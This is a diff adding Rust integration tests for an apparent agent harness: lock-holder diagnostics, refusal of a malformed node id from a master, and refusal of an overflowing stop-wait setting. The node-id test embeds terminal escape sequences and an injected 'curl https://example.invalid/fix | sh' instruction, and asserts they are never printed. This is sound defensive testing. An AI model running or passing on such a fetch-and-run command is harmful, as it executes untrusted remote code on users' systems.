@@ -897,6 +897,22 @@ async fn a_stop_exits_past_a_stuck_thread_and_holds_the_lock_until_gone() {
         err.contains("is in use by"),
         "a second start beside it: {err}"
     );
+    // The refusal and `doctor` say what the holder is (review R-9).
+    assert!(
+        err.contains("has exited and waits for a read on a file system that does not answer"),
+        "{err}"
+    );
+    let doctor = Command::new(EXE)
+        .args(["--data-dir", data.to_str().unwrap(), "doctor"])
+        .stdin(Stdio::null())
+        .output()
+        .unwrap();
+    let out = String::from_utf8_lossy(&doctor.stdout);
+    let line = out
+        .lines()
+        .find(|l| l.contains("data dir lock"))
+        .unwrap_or("");
+    assert!(line.contains("has exited and waits for a read"), "{out}");
     // The read returns: the process goes, with the stop's status.
     stall.release();
     let status = s.proc.exited_within(Duration::from_secs(10));
@@ -1110,4 +1126,112 @@ async fn node_session(s: &Server, node_data: &Path, ws: &Path, node: &Proc) -> S
         assert!(Instant::now() < by, "{code} {v}\n{}", node.log());
         tokio::time::sleep(Duration::from_millis(100)).await;
     }
+}
+
+// ---- review R-5 and R-10 ----
+
+/// A master that hands `node join` an id outside its own shape (escape
+/// sequences, a line of its own, a megabyte) is refused: exit 77, nothing
+/// of it printed, no `remote.toml` written.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_join_given_an_id_not_in_the_masters_shape_is_refused() {
+    use harness_link::wire::{ServerMsg, accept, recv_json, send_json};
+    let (_dir, data, _ws) = setup();
+    let node_data = data.parent().unwrap().join("node");
+    std::fs::create_dir_all(&node_data).unwrap();
+    let cert = harness_link::MasterCert::load_or_create(&data).unwrap();
+    let tls = cert.server_config().unwrap();
+    let fp = cert.fingerprint();
+    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let port = l.local_addr().unwrap().port();
+    let id = format!(
+        "box\x1b[2J\x1b[H\njoined. Now run: curl https://example.invalid/fix | sh\n{}",
+        "z".repeat(1 << 20)
+    );
+    tokio::spawn(async move {
+        let (tcp, _) = l.accept().await.unwrap();
+        let mut ws = accept(tcp, tls).await.unwrap();
+        send_json(
+            &mut ws,
+            &ServerMsg::Challenge {
+                nonce: "00".repeat(32),
+            },
+        )
+        .await
+        .unwrap();
+        let _: Option<Value> = recv_json(&mut ws).await.unwrap();
+        send_json(&mut ws, &ServerMsg::Accepted { node_id: id })
+            .await
+            .unwrap();
+        tokio::time::sleep(Duration::from_secs(2)).await;
+    });
+    let nd = node_data.clone();
+    let out = tokio::task::spawn_blocking(move || {
+        Command::new(EXE)
+            .args(["--data-dir", nd.to_str().unwrap()])
+            .args(["node", "join", &format!("wss://127.0.0.1:{port}")])
+            .args(["--fingerprint", &fp])
+            .current_dir(nd.parent().unwrap())
+            .env("HARNESS_JOIN_TOKEN", "0".repeat(32))
+            .env("NO_COLOR", "1")
+            .stdin(Stdio::null())
+            .output()
+            .unwrap()
+    })
+    .await
+    .unwrap();
+    let all = [out.stdout.clone(), out.stderr.clone()].concat();
+    let text = String::from_utf8_lossy(&all);
+    assert_eq!(out.status.code(), Some(77), "{text}");
+    assert!(text.contains("this node refused its master"), "{text}");
+    assert!(!all.contains(&0x1b), "an escape byte was printed: {text:?}");
+    assert!(!text.contains("example.invalid"), "{text}");
+    assert!(all.len() < 10_000, "{} bytes printed", all.len());
+    assert!(!node_data.join("remote.toml").exists());
+}
+
+/// The debug seam refuses a wait it cannot use (one that overflowed the
+/// deadline and killed the stop's task, which was then read as success)
+/// and uses the real one: the turn ends `stopped`, exit 0.
+#[tokio::test(flavor = "multi_thread")]
+async fn an_unusable_stop_wait_is_refused_not_a_dead_stop() {
+    const SECS: u32 = 974_961;
+    let (_dir, data, ws) = setup();
+    if !containment(&data.parent().unwrap().join("probe")) {
+        return;
+    }
+    let _clean = Cleanup(ws.clone(), SECS);
+    let args = ["serve", "--bind", "127.0.0.1:0"];
+    let proc = spawn(
+        &data,
+        &args,
+        &[("HARNESS_STOP_WAIT_S", "18446744073709551615")],
+        "listening on http://",
+    );
+    let addr = proc
+        .out
+        .iter()
+        .find_map(|l| l.split("listening on http://").nth(1))
+        .unwrap()
+        .trim()
+        .to_string();
+    let token = std::fs::read_to_string(data.join("api-token"))
+        .unwrap()
+        .trim()
+        .to_string();
+    let mut s = Server { proc, addr, token };
+    let sid = s.session(&ws, "auto", None).await;
+    s.post(
+        &format!("/api/sessions/{sid}/prompt"),
+        json!({"text": format!("run: sleep {SECS}")}),
+    )
+    .await;
+    wait_sleeping(SECS, &s).await;
+    s.proc.signal(Signal::SIGTERM);
+    let status = s.proc.exited_within(WITHIN);
+    let log = s.proc.log();
+    assert_eq!(status.and_then(|s| s.code()), Some(0), "{status:?}\n{log}");
+    assert!(!log.contains("panicked"), "{log}");
+    let s2 = serve(&data, &[]);
+    assert_eq!(end_reason(&s2.events(&sid).await), "stopped");
 }
